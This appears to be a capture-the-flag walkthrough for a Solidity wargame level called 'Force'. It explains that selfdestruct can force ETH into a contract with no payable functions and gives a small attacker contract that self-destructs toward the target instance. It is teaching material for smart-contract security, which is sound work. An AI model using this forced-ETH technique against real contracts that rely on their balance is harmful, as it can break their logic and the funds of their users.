# Force

A contract will be forced to accept ETH if it is set as a coinbase or set as the receipient address of a selfdestruct. Therefore, you can never rely on a contract's balance to be zero even if you don't have any payable functions.

Deploy the smart contract below, fund it with some ETH, and then destroy it. Claim the flag.

```javascript
// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

import "@openzeppelin/contracts/access/Ownable.sol";

contract TakeMyMoney is Ownable {
    
    address public forceInstance;
    
    constructor(address _instance) {
        forceInstance = _instance;
    }
    
    receive() external payable {}
    
    function destroy() external onlyOwner {
        selfdestruct(payable(forceInstance));
    }
}
```